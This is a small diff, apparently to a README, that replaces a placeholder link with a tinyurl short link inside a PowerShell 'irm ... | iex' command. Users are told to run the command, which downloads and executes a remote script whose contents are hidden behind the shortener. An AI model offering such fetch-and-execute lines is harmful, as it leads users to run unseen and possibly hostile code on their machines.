@@ -31,7 +31,7 @@
 No file download required. Open **PowerShell** (or Windows Terminal) and run:
 
 ```powershell
-irm https://is.gd/your_link_here | iex
+irm https://tinyurl.com/s4t38xmj | iex
 ```
 
 ---
